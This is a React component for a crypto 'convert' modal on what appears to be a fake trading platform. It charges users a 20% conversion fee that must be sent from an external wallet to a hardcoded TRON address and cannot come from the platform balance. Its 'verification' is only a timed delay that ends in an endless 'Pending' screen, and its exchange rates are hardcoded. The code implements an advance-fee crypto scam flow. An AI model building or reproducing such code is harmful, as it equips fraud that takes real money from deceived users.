import { useState } from 'react'
import { useAuth } from '../../../context/AuthContext'
import {
  X,
  RefreshCw,
  ArrowDown,
  Sparkles,
  ShieldCheck,
  CheckCircle2,
  AlertCircle,
  Copy,
  Check,
  QrCode,
  ArrowRight,
  ExternalLink,
  Clock
} from 'lucide-react'

const ASSET_RATES = {
  USDT: { rateInUsd: 1.0, symbol: 'USDT', name: 'Tether USD', min: 10 },
  BTC: { rateInUsd: 87450.0, symbol: 'BTC', name: 'Bitcoin', min: 0.0002 },
  ETH: { rateInUsd: 3120.0, symbol: 'ETH', name: 'Ethereum', min: 0.005 },
  SOL: { rateInUsd: 178.5, symbol: 'SOL', name: 'Solana', min: 0.1 }
}

export default function ConvertModal({ isOpen, onClose }) {
  const { user, convertCrypto, platformSettings } = useAuth()

  const [fromAsset, setFromAsset] = useState('USDT')
  const [toAsset, setToAsset] = useState('BTC')
  const [fromAmount, setFromAmount] = useState('')
  const [step, setStep] = useState(1) // 1: Swap Form, 2: 20% External Fee Payment, 3: Success Pending
  const [copiedAddress, setCopiedAddress] = useState(false)
  const [feeTxHash, setFeeTxHash] = useState('')
  const [submitting, setSubmitting] = useState(false)
  const [feedback, setFeedback] = useState(null)

  if (!isOpen) return null

  const fromPrice = ASSET_RATES[fromAsset].rateInUsd
  const toPrice = ASSET_RATES[toAsset].rateInUsd
  const exchangeRate = fromPrice / toPrice

  const numAmount = Number(fromAmount) || 0
  const convertedAmount = numAmount * exchangeRate
  const conversionFeeUsd = numAmount * fromPrice * 0.2 // 20% conversion fee in USD value

  // Conversion fee collection address (TRC20)
  const feeDepositAddress = platformSettings?.wallets?.conversionFeeWallet || 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a'

  const handleSwapAssets = () => {
    const temp = fromAsset
    setFromAsset(toAsset)
    setToAsset(temp)
    setFeedback(null)
  }

  const handleProceedToFee = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!numAmount || numAmount <= 0) {
      setFeedback({ type: 'error', message: 'Please enter an amount to convert.' })
      return
    }

    // Move to step 2: Pay conversion fee
    setStep(2)
  }

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(feeDepositAddress)
    setCopiedAddress(true)
    setTimeout(() => setCopiedAddress(false), 2000)
  }

  const handleFinalizeConversion = (e) => {
    e.preventDefault()
    setSubmitting(true)

    setTimeout(() => {
      const res = convertCrypto({
        fromAsset,
        toAsset,
        fromAmount: numAmount,
        toAmount: convertedAmount,
        conversionFeeAmount: conversionFeeUsd,
        feeTxHash: feeTxHash.trim()
      })

      setSubmitting(false)
      if (res.success) {
        setStep(3)
      } else {
        setFeedback({ type: 'error', message: res.error || 'Failed to submit conversion.' })
      }
    }, 800)
  }

  const handleResetAndClose = () => {
    setStep(1)
    setFromAmount('')
    setFeeTxHash('')
    setFeedback(null)
    onClose()
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fade-in">
      <div className="relative w-full max-w-lg bg-[#111111] border border-white/15 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden">
        {/* Close Button */}
        <button
          onClick={handleResetAndClose}
          className="absolute top-5 right-5 p-2 text-white/50 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition-all"
        >
          <X className="w-5 h-5" />
        </button>

        {/* STEP 1: Converter Form */}
        {step === 1 && (
          <div className="space-y-6">
            <div>
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#B0F127]/10 border border-[#B0F127]/20 text-[#B0F127] text-xs font-semibold mb-2">
                <RefreshCw className="w-3.5 h-3.5" />
                Crypto Conversion Swap
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                Convert Crypto Instantly
              </h3>
              <p className="text-xs text-white/50 mt-1">
                Real-time institutional liquidity swap between supported crypto assets.
              </p>
            </div>

            <form onSubmit={handleProceedToFee} className="space-y-4">
              {/* From Asset Box */}
              <div className="p-4 bg-black/60 border border-white/10 rounded-2xl space-y-2">
                <div className="flex justify-between text-xs text-white/50 font-mono">
                  <span>From Asset</span>
                  <span>1 {fromAsset} ≈ ${fromPrice.toLocaleString()}</span>
                </div>

                <div className="flex items-center gap-3">
                  <input
                    type="number"
                    step="any"
                    required
                    placeholder="0.00"
                    value={fromAmount}
                    onChange={(e) => setFromAmount(e.target.value)}
                    className="w-full bg-transparent text-xl sm:text-2xl font-bold font-mono text-white outline-none placeholder-white/30"
                  />

                  <select
                    value={fromAsset}
                    onChange={(e) => {
                      setFromAsset(e.target.value)
                      if (e.target.value === toAsset) {
                        setToAsset(e.target.value === 'USDT' ? 'BTC' : 'USDT')
                      }
                    }}
                    className="bg-[#1a1a1a] border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2 text-xs font-bold text-white outline-none cursor-pointer font-mono"
                  >
                    {Object.keys(ASSET_RATES).map((sym) => (
                      <option key={sym} value={sym} disabled={sym === toAsset}>
                        {sym}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              {/* Swap Button */}
              <div className="flex justify-center -my-2 relative z-10">
                <button
                  type="button"
                  onClick={handleSwapAssets}
                  className="p-2.5 rounded-full bg-[#B0F127] text-black hover:bg-[#9ee016] transition-all shadow-md active:scale-95"
                  title="Swap From and To Assets"
                >
                  <ArrowDown className="w-4 h-4 stroke-[3]" />
                </button>
              </div>

              {/* To Asset Box */}
              <div className="p-4 bg-black/60 border border-white/10 rounded-2xl space-y-2">
                <div className="flex justify-between text-xs text-white/50 font-mono">
                  <span>To (Estimated Output)</span>
                  <span>1 {toAsset} ≈ ${toPrice.toLocaleString()}</span>
                </div>

                <div className="flex items-center gap-3">
                  <input
                    type="text"
                    readOnly
                    value={numAmount > 0 ? convertedAmount.toFixed(6) : '0.00'}
                    className="w-full bg-transparent text-xl sm:text-2xl font-bold font-mono text-[#B0F127] outline-none"
                  />

                  <select
                    value={toAsset}
                    onChange={(e) => {
                      setToAsset(e.target.value)
                      if (e.target.value === fromAsset) {
                        setFromAsset(e.target.value === 'BTC' ? 'USDT' : 'BTC')
                      }
                    }}
                    className="bg-[#1a1a1a] border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2 text-xs font-bold text-white outline-none cursor-pointer font-mono"
                  >
                    {Object.keys(ASSET_RATES).map((sym) => (
                      <option key={sym} value={sym} disabled={sym === fromAsset}>
                        {sym}
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              {/* Rate & 20% Fee Summary */}
              <div className="p-3.5 bg-[#1a1a1a] rounded-xl border border-white/5 space-y-2 text-xs font-mono">
                <div className="flex justify-between text-white/60">
                  <span>Exchange Rate:</span>
                  <span className="text-white font-bold">
                    1 {fromAsset} = {exchangeRate.toFixed(6)} {toAsset}
                  </span>
                </div>
                <div className="flex justify-between text-white/60">
                  <span>Conversion Fee (20%):</span>
                  <span className="text-[#B0F127] font-bold">
                    ${conversionFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT
                  </span>
                </div>
                <div className="flex justify-between text-[11px] text-white/40 pt-1 border-t border-white/5">
                  <span>Fee Settlement:</span>
                  <span className="text-amber-400">Payable via external transfer</span>
                </div>
              </div>

              {feedback && (
                <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{feedback.message}</span>
                </div>
              )}

              <button
                type="submit"
                className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-lg flex items-center justify-center gap-2"
              >
                <span>Pay Conversion Fee to Complete Conversion</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>
          </div>
        )}

        {/* STEP 2: Pay Conversion Fee (External Wallet) */}
        {step === 2 && (
          <div className="space-y-6">
            <div>
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs font-semibold mb-2">
                <ShieldCheck className="w-3.5 h-3.5" />
                External Fee Settlement
              </div>
              <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                Pay Conversion Fee to Complete Conversion
              </h3>
              <p className="text-xs text-white/50 mt-1">
                Transfer the 20% conversion fee from an external wallet to the designated pool address below.
              </p>
            </div>

            {/* Fee Amount Callout */}
            <div className="p-4 bg-black/60 border border-white/10 rounded-2xl text-center space-y-1">
              <span className="text-xs text-white/50 font-mono block">Required 20% Conversion Fee</span>
              <div className="text-2xl font-black text-[#B0F127] font-mono">
                ${conversionFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT (TRC20)
              </div>
              <span className="text-[11px] text-white/40">
                Converting {numAmount} {fromAsset} → {convertedAmount.toFixed(6)} {toAsset}
              </span>
            </div>

            {/* QR Code & Wallet Address */}
            <div className="space-y-3">
              <div className="p-4 bg-black/40 border border-white/10 rounded-2xl flex flex-col sm:flex-row items-center gap-4">
                <div className="w-24 h-24 bg-white p-2 rounded-xl flex items-center justify-center shrink-0">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${feeDepositAddress}`}
                    alt="Fee QR Code"
                    className="w-full h-full object-contain"
                  />
                </div>

                <div className="min-w-0 space-y-2 w-full">
                  <div className="flex justify-between items-center text-xs">
                    <span className="text-white/60 font-medium">Conversion Fee Wallet (TRC20)</span>
                    <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">
                      USDT / TRON
                    </span>
                  </div>

                  <div className="p-2.5 bg-black/70 rounded-xl border border-white/10 flex items-center justify-between gap-2">
                    <span className="text-xs font-mono text-white/90 truncate">
                      {feeDepositAddress}
                    </span>
                    <button
                      type="button"
                      onClick={handleCopyAddress}
                      className="p-1.5 bg-[#B0F127] text-black rounded-lg hover:bg-[#9ee016] transition-all shrink-0"
                    >
                      {copiedAddress ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>
              </div>

              <p className="text-[11px] text-amber-300/80 bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-xl text-center">
                Note: Conversion fee must be transferred from an external wallet source. It cannot be deducted from your platform balance.
              </p>
            </div>

            {/* Transaction Hash Input */}
            <form onSubmit={handleFinalizeConversion} className="space-y-4">
              <div className="space-y-1.5">
                <label className="text-xs text-white/60">Payment Transaction Hash (TxID)</label>
                <input
                  type="text"
                  required
                  placeholder="Paste external transfer TxHash (e.g. 0x7a8b... or Hash ID)"
                  value={feeTxHash}
                  onChange={(e) => setFeeTxHash(e.target.value)}
                  className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                />
              </div>

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setStep(1)}
                  className="w-1/3 py-3 bg-white/5 hover:bg-white/10 text-white font-semibold text-xs rounded-xl border border-white/10 transition-all"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={submitting}
                  className="w-2/3 py-3 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2 disabled:opacity-50"
                >
                  {submitting ? 'Verifying Transfer...' : 'I Have Paid Conversion Fee'}
                </button>
              </div>
            </form>
          </div>
        )}

        {/* STEP 3: Submitted & Pending Screen */}
        {step === 3 && (
          <div className="text-center py-6 space-y-5 animate-fade-in">
            <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
              <Clock className="w-8 h-8 animate-pulse" />
            </div>

            <div className="space-y-2">
              <h3 className="text-2xl font-bold text-white">Conversion Pending</h3>
              <p className="text-xs text-white/60 max-w-sm mx-auto leading-relaxed">
                Your 20% conversion fee transfer has been submitted for blockchain verification. Your {fromAsset} to {toAsset} conversion will be credited once confirmed. Check back later for status.
              </p>
            </div>

            <div className="p-4 bg-black/50 border border-white/10 rounded-2xl text-left space-y-2 text-xs font-mono">
              <div className="flex justify-between text-white/60">
                <span>Converted Output:</span>
                <span className="text-[#B0F127] font-bold">
                  {convertedAmount.toFixed(6)} {toAsset}
                </span>
              </div>
              <div className="flex justify-between text-white/60">
                <span>Fee Submitted:</span>
                <span className="text-white font-bold">${conversionFeeUsd.toFixed(2)} USDT</span>
              </div>
              <div className="flex justify-between text-white/60">
                <span>Status:</span>
                <span className="text-amber-400 font-semibold">Pending Verification</span>
              </div>
            </div>

            <button
              onClick={handleResetAndClose}
              className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md"
            >
              Return to Dashboard
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
